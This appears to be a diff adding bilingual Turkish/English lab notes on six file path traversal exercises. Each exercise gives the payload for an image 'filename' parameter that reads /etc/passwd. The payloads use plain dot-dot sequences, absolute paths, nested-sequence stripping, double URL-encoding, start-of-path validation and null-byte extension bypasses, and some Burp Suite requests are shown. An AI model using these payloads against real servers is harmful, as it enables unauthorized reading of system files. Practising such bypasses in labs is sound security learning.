@@ -1,0 +1,48 @@
+					       PATH TRAVERSAL
+#################################################
+#				File path traversal, simple case        #
+#				Dosya yolu geçişi, basit durum          #
+#################################################
+1--> /image?filename=../../../etc/passwd
+burpsuite isteklerden filename parametresine ../../../etc/passwd
+payloadını ekleyerek çalıştırabiliyoruz.
+
+###################################################################################
+#		File path traversal, traversal sequences blocked with absolute path bypass    #
+#		Dosya yolu geçişi, geçiş dizileri mutlak yol atlamayla engellendi             #
+###################################################################################
+2--> /image?filename=/etc/passwd
+burpsuite isteklerden filename parametresine /etc/passwd
+payloadını ekleyerek çalıştırabiliyoruz.
+
+###################################################################################
+#		File path traversal, traversal sequences stripped non-recursively             #
+#		Dosya yolu geçişi, geçiş dizileri yinelemeli olmayan bir şekilde çıkarıldı    #
+###################################################################################
+3--> /image?filename=....//....//....//etc/passwd
+burpsuite isteklerden filename parametresine ....//....//....//etc/passwd
+payloadını ekleyerek çalıştırabiliyoruz.
+
+#####################################################################################
+#		File path traversal, traversal sequences stripped with superfluous URL-decode   #
+#		Dosya yolu geçişi, gereksiz URL kod çözme ile soyulan geçiş dizileri            #
+#####################################################################################
+4--> /image?filename=..%252f..%252f..%252fetc/passwd
+burpsuite isteklerden filename parametresine ..%252f..%252f..%252fetc/passwd
+payloadını ekleyerek çalıştırabiliyoruz.
+
+############################################################
+#		File path traversal, validation of start of path       #
+#	  Dosya yolu geçişi, yolun başlangıcının doğrulanması    #
+############################################################
+5--> /var/www/images/../../../etc/passwd payloadını çalıştırıyoruz.
+GET /image?filename=/var/www/images/10.jpg HTTP/2 => burpsuite request
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2 => payload çalışır.
+
+##############################################################################
+#		File path traversal, validation of file extension with null byte bypass  #
+#		Dosya yolu geçişi, boş bayt atlamayla dosya uzantısının doğrulanması     #
+##############################################################################
+6--> ../../../etc/passwd%00.png => payload
+GET /image?filename=6.jpg HTTP/2 => exloit edilecek parametre
+GET /image?filename=../../../etc/passwd%00.png => response üzerinden passwd okunabiliyor.
